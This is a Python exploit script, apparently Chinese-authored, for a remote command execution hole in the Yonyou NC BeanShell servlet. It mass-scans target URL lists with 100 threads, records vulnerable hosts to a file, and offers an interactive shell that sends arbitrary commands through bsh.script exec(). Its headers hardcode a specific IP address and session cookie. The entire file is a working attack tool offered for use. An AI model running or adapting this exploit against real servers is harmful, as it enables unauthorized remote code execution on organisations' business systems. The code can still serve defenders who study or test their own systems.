import sys,re,requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()    #解除警告

def banner():
    banner = """
                                                   _______  _________  
 ___.__. ____   ____    ____ ___.__. ____  __ __   \      \ \_   ___ \ 
<   |  |/  _ \ /    \  / ___<   |  |/  _ \|  |  \  /   |   \/    \  \/ 
 \___  (  <_> )   |  \/ /_/  >___  (  <_> )  |  / /    |    \     \____
 / ____|\____/|___|  /\___  // ____|\____/|____/  \____|__  /\______  /
 \/                \//_____/ \/                           \/        \/ 
                                                     version:nc.1.0    author:YeahSir
"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="用友nc命令执行poc&exp")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tuage:python {sys.argv[0]} -h")



def poc(target):
    headers = {
        "Content-Length":"44",
        "Cache-Control":"max-age=0",
        "Upgrade-Insecure-Requests":"1",
        "Origin":"http://49.74.217.252:3333",
        "Content-Type":"application/x-www-form-urlencoded",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer":"http://49.74.217.252:3333/servlet/~ic/bsh.servlet.BshServlet",
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
        "Cookie":"JSESSIONID=0942DB55744799405632F36F0F62C3B2.server",
        "Connection":"close",
    }
    data = 'bsh.script=print("haha")'
    payload_url = '/servlet/~ic/bsh.servlet.BshServlet'
    url = target + payload_url
    try:
        res = requests.get(url = url)
        if res.status_code == 200:
            res2 = requests.post(url=url,data=data,headers=headers,timeout=5)
            match = re.search(r'<pre>(.*?)</pre>',res2.text,re.S)
            if 'haha' in match.group(1):
                print(f'[+]该{target}存在命令指令漏洞')
                with open ('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
                    return True
            else:
                print(f'[-]该{target}不存在命令执行漏洞')
                return False
        else:
            print(f'[0]该{target}连接失败，请手动测试')
    except Exception as e:
        print(f'[*]该站点{target}存在问题，请手动测试'+e)
        return False
    

def exp(target):
    print("----------正在进行漏洞利用----------")
    time.sleep(2)
    while True:
        cmd = input('请输入你要执行的命令(输入q退出)：')
        if cmd == 'q' :
            print('正在退出')
            break
        headers = {
            "Content-Length":"44",
            "Cache-Control":"max-age=0",
            "Upgrade-Insecure-Requests":"1",
            "Origin":"http://49.74.217.252:3333",
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer":"http://49.74.217.252:3333/servlet/~ic/bsh.servlet.BshServlet",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
            "Cookie":"JSESSIONID=0942DB55744799405632F36F0F62C3B2.server",
            "Connection":"close",
        }
        data = f'bsh.script=exec("{cmd}")'
        res = requests.post(url=target+'/servlet/~ic/bsh.servlet.BshServlet',headers=headers,data=data)
        match = re.search(r'<pre>(.*?)</pre>',res.text,re.S)
        print(match.group(1).split())

            



if __name__ == '__main__':
    main()